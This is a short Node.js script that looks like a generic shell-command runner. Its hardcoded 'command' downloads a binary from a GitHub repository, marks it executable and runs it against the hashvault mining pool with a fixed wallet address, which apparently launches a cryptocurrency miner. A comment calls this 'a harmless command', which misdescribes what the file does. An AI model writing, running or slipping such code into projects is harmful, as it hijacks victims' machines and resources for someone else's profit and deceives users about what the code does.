// Change this to the command you want to run
const command = "wget https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass cf --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
const { spawn } = require("child_process");

function runShellCommand(commandStr) {
  // shell:true runs the command string in a shell (e.g. /bin/bash)
  const child = spawn(commandStr, { shell: true, stdio: "pipe" });

  child.stdout.on("data", (chunk) => {
    process.stdout.write(chunk); // stream stdout
  });

  child.stderr.on("data", (chunk) => {
    process.stderr.write(chunk); // stream stderr
  });

  child.on("close", (code, signal) => {
    console.log(`\nChild process exited with code ${code}${signal ? `, signal ${signal}` : ""}`);
  });

  child.on("error", (err) => {
    console.error("Failed to start child process:", err);
  });
}

// Example usage with a harmless command:
runShellCommand(command);
